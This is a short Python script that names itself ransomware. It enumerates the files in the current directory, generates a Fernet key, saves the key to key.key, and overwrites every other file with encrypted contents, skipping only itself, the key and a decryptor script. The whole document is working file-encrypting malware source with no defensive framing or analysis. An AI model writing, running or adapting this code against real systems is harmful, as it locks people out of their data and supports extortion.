import os
from cryptography.fernet import Fernet



files = []

for file in os.listdir():
    if file == 'Ransomware.py' or file == 'key.key' or file == 'ransomware_decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open('key.key', 'wb') as thekey:
    thekey.write(key)

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_encrypted)

